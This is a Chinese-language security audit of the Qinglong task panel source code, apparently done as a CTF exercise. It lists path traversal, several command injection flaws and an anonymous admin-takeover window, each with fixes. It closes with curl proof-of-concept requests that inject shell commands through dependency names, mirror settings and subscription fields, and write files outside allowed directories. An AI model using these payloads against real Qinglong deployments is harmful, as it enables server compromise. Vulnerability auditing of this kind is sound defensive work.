漏洞发现（静态审计，按严重度）

1. CRITICAL 配置文件写入越权 + 路径穿越（可任意文件写）
   位置: back/api/config.ts:74 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/config.ts:74), back/api/
   config.ts:77 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/config.ts:77), back/api/config.ts:81 (/
   Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/config.ts:81), back/services/config.ts:19 (/Users/zsm/
   CTF/源码审计-代码部分/qinglong/back/services/config.ts:19), back/services/config.ts:37 (/Users/zsm/CTF/源
   码审计-代码部分/qinglong/back/services/config.ts:37)
   利用方法: POST /api/configs/save 中 name 可控且未做 resolve+前缀校验；黑名单命中后 res.send 未 return，仍
   继续写文件。可构造 ../../ 或黑名单文件名实现覆盖。
   修复方法: 黑名单命中必须立即 return；统一 const final=path.resolve(base,name) 后校验前缀；拒绝绝对路径
   和 ..；文件名改白名单策略（正则）。
2. CRITICAL 脚本模块多处路径校验缺失（任意路径写入/目录创建）
   位置: back/api/script.ts:146 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/script.ts:146), back/
   api/script.ts:155 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/script.ts:155), back/api/
   script.ts:163 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/script.ts:163), back/api/script.ts:168
   (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/script.ts:168), back/api/script.ts:318 (/Users/zsm/
   CTF/源码审计-代码部分/qinglong/back/api/script.ts:318)
   利用方法: POST /api/scripts 仅做字符串 startsWith，可用 /合法前缀/../../ 绕过；filename/directory/path 参
   与 join 未规范化。PUT /api/scripts/run 也可借 path 写出 scriptPath 外。
   修复方法: 所有写操作前使用 path.resolve 并强制落在允许目录；filename/directory 使用 path.basename 并拒绝
   分隔符；复用 checkFilePath 到 POST/run/stop 全分支。
3. CRITICAL 依赖管理命令注入（name 直拼 shell）
   位置: back/api/dependence.ts:39 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/dependence.ts:39),
   back/config/util.ts:573 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/config/util.ts:573), back/config/
   util.ts:587 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/config/util.ts:587), back/services/
   dependence.ts:303 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/services/dependence.ts:303)
   利用方法: 依赖名可传入如 a;id>/tmp/pwn;#，最终在 spawn(...,{shell:'/bin/bash'}) 执行。
   修复方法: 严格校验依赖名（按 npm/pip/apk 规则）；改为 spawn(binary,args,{shell:false})；禁止 ;&|$()<> 等
   元字符。
4. CRITICAL 系统配置与数据导出命令注入
   位置: back/api/system.ts:135 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/system.ts:135), back/
   api/system.ts:153 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/system.ts:153), back/api/
   system.ts:171 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/system.ts:171), back/api/system.ts:325
   (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/system.ts:325), back/services/system.ts:157 (/Users/
   zsm/CTF/源码审计-代码部分/qinglong/back/services/system.ts:157), back/services/system.ts:205 (/Users/zsm/
   CTF/源码审计-代码部分/qinglong/back/services/system.ts:205), back/services/system.ts:236 (/Users/zsm/CTF/
   源码审计-代码部分/qinglong/back/services/system.ts:236), back/services/system.ts:446 (/Users/zsm/CTF/源码
   审计-代码部分/qinglong/back/services/system.ts:446), back/services/schedule.ts:79 (/Users/zsm/CTF/源码审
   计-代码部分/qinglong/back/services/schedule.ts:79)
   利用方法: nodeMirror/pythonMirror/linuxMirror/type[] 仅 Joi.string，后续直接拼接到 shell 命令，注入可执行
   任意命令。
   修复方法: URL/参数做严格格式校验；导出类型改为枚举白名单；禁用 shell 字符串执行，统一参数化执行。
5. HIGH 订阅任务命令注入（引号逃逸）
   位置: back/api/subscription.ts:42 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/
   subscription.ts:42), back/config/subscription.ts:39 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/
   config/subscription.ts:39), back/services/schedule.ts:79 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/
   services/schedule.ts:79)
   利用方法: whitelist/blacklist/branch/... 未转义，拼接为 "${用户输入}"；若输入包含 " 可闭合并注入额外命
   令。
   修复方法: 所有参数改 argv 传参；对字段加字符白名单；必要时使用安全转义库并记录审计日志。
6. HIGH 首次部署初始化劫持窗口（未初始化时可匿名设管理员）
   位置: back/loaders/initData.ts:54 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/loaders/
   initData.ts:54), back/config/index.ts:179 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/config/
   index.ts:179), back/api/user.ts:220 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/api/user.ts:220),
   back/loaders/express.ts:101 (/Users/zsm/CTF/源码审计-代码部分/qinglong/back/loaders/express.ts:101)
   利用方法: 新实例仍为 admin/admin 时，/api/user/init 在白名单内，可被先到先得设置新口令（若公网暴露）。
   修复方法: 初始化接口仅限本地或一次性安装令牌；移除公网匿名初始化；首次安装强制交互式安全引导。

7. 先启动服务并拿到 JWT

# 假设后端在 5700

BASE="http://127.0.0.1:5700"

# 若是全新实例（admin/admin），可先初始化一次；已初始化会返回 450，可忽略

curl -s -X PUT "$BASE/api/user/init" \
 -H 'Content-Type: application/json' \
 -d '{"username":"audit","password":"Audit@123456"}'

# 登录拿 token（按你当前有效账号替换）

TOKEN=$(curl -s -X POST "$BASE/api/user/login" \
 -H 'Content-Type: application/json' \
 -d '{"username":"audit","password":"Audit@123456"}' | jq -r '.data.token')

echo "$TOKEN"

2. 验证 configs/save 路径穿越任意写

curl -s -X POST "$BASE/api/configs/save" \
 -H "Authorization: Bearer $TOKEN" \
 -H 'Content-Type: application/json' \
 -d '{"name":"../../../../tmp/poc_cfg.txt","content":"CFG_POC"}'

cat /tmp/poc_cfg.txt

判定：/tmp/poc_cfg.txt 存在即漏洞成立。

3. 验证 scripts 写路径绕过

ROOT="$(pwd)"
  curl -s -X POST "$BASE/api/scripts" \
 -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"filename\":\"poc_script.txt\",\"path\":\"$ROOT/data/scripts/../../../../tmp/\",\"content\":
\"SCRIPT_POC\"}"

cat /tmp/poc_script.txt

判定：/tmp/poc_script.txt 存在即漏洞成立。

4. 验证依赖管理命令注入（dependencies）

curl -s -X POST "$BASE/api/dependencies" \
 -H "Authorization: Bearer $TOKEN" \
 -H 'Content-Type: application/json' \
 -d '[{"name":"left-pad;echo DEP_POC>/tmp/poc_dep #","type":0}]'

sleep 3
cat /tmp/poc_dep

判定：/tmp/poc_dep 存在即命令注入成立。

5. 验证系统配置命令注入（python-mirror）

curl -s -X PUT "$BASE/api/system/config/python-mirror" \
 -H "Authorization: Bearer $TOKEN" \
 -H 'Content-Type: application/json' \
 -d '{"pythonMirror":"https://pypi.org/simple;echo SYS_POC>/tmp/poc_sys #"}'

cat /tmp/poc_sys

判定：/tmp/poc_sys 存在即命令注入成立。

6. 验证订阅命令注入（引号逃逸）

SUB*ID=$(curl -s -X POST "$BASE/api/subscriptions" \
 -H "Authorization: Bearer $TOKEN" \
 -H 'Content-Type: application/json' \
 -d '{"type":"public-repo","schedule":"*/30 \_ \* \*
\*","schedule_type":"crontab","alias":"poc_sub_1","url":"https://example.com/repo.git","whitelist":"\";echo
SUB_POC>/tmp/poc_sub;#"}' | jq -r '.data.id')

curl -s -X PUT "$BASE/api/subscriptions/run" \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "[$SUB_ID]"

sleep 3
cat /tmp/poc_sub

判定：/tmp/poc_sub 存在即命令注入成立。

7. 验证“未初始化可匿名接管”（仅新装实例）

curl -s -X PUT "$BASE/api/user/init" \
 -H 'Content-Type: application/json' \
 -d '{"username":"attacker","password":"Attacker@123"}'

判定：在未初始化状态下返回 code:200，说明存在初始化劫持窗口。

清理：

rm -f /tmp/poc_cfg.txt /tmp/poc_script.txt /tmp/poc_dep /tmp/poc_sys /tmp/poc_sub
